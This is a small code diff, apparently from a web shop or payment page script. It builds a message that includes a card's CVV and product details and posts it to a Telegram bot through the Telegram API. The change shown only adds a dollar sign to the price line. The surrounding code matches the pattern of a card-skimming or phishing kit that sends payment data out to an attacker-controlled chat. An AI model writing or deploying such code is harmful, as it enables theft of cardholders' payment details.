@@ -75,7 +75,7 @@ CVV: ${cvv}
 
 Products:
 Products name: ${mahsulot_name}
-Products price: ${mahsulotl_price}
+Products price: ${mahsulotl_price}$
 `;
 
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
